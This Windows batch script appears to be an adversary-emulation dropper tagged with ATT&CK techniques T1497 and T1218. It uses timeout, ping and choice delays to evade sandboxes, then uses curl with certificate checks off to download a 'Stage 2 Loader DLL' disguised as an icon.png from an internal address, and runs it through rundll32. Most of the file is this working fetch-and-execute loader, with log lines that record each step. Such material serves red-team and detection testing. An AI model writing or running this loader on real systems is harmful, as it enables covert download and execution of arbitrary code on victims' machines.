@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET a7x3m9=%APPDATA%\10899\51573f94
SET b9y2n8=0d1adf71.txt
SET c1z8p4=https://10.0.0.49/stage/2/icon.png?10899-7
SET d4w5q2=BALAM-S2BO
SET e6r7s0=10899
SET f2t3u1=7
SET g8h9i5=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM --- Begin T1497: Virtualization/Sandbox Evasion ---
REM Delay 1: 10-20s using timeout (method 1)
timeout /t 15 /nobreak >nul 2>&1

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: heartbeat_start>> "!g8h9i5!" 2>nul

REM --- Heartbeat fetch: download Stage 2 Loader DLL ---
curl -k -s -o "!a7x3m9!\!b9y2n8!" "!c1z8p4!" 

REM Debug: heartbeat_complete
echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: heartbeat_complete>> "!g8h9i5!" 2>nul

REM Delay 2: 5-15s using ping (method 2)
ping -n 8 127.0.0.1 >nul 2>&1

REM --- Change directory to output directory ---
REM Debug: chdir_start
echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: chdir_start>> "!g8h9i5!" 2>nul

cd /d "!a7x3m9!" >nul 2>&1

REM Debug: chdir_result
if %errorlevel% equ 0 (
    echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: chdir_result=0>> "!g8h9i5!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: chdir_result=1>> "!g8h9i5!" 2>nul
)

REM Delay 3: 5-15s using choice (method 3)
choice /C Y /N /D Y /T 7 >nul 2>&1

REM --- Anti-analysis: Debugger check (Thread.Sleep random 2000-5000ms if attached, continue) ---
REM Keep simple - simulate sleep delay
SET /A debug_delay=%RANDOM% %% 3000 + 2000
REM Note: In batch we can't directly call Thread.Sleep, but we can use timeout as proxy
timeout /t %debug_delay% /nobreak >nul 2>&1

REM Debug: rundll32_start
echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: rundll32_start>> "!g8h9i5!" 2>nul

REM --- T1218: System Binary Proxy Execution (rundll32) ---
rundll32.exe "!b9y2n8!", RunDLLW

REM Debug: rundll32_complete
echo [!tsvar!][DEBUG][!d4w5q2!][!e6r7s0!]: rundll32_complete>> "!g8h9i5!" 2>nul

REM --- Logging TTPs ---
REM T1497 log
echo [!tsvar!][TTP][!d4w5q2!][!e6r7s0!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!g8h9i5!" 2>nul

REM T1218 log
echo [!tsvar!][TTP][!d4w5q2!][!e6r7s0!]: T1218|System Binary Proxy Execution=OK:>> "!g8h9i5!" 2>nul

REM --- Final random delay ---
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul 2>&1

endlocal